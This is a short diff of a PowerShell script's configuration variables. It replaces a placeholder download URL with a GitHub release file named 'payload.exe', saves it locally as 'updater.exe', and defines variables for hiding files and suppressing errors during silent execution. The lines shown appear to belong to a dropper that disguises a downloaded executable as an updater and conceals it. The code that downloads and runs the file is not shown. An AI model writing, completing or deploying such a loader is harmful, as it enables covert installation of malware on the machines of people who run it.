@@ -1,5 +1,5 @@
 # Define variables
-$downloadUrl = "https://yourwebsite.com/updater.exe"  # URL of the file to download
+$downloadUrl = "https://github.com/nyctsne/m2/releases/download/m/payload.exe"  # URL of the file to download
 $updaterExe = "updater.exe"                           # Name of the downloaded file
 $hiddenAttr = "Hidden"                                # Attribute to hide files/folders
 $silentlyContinue = "SilentlyContinue"               # Error action for silent execution
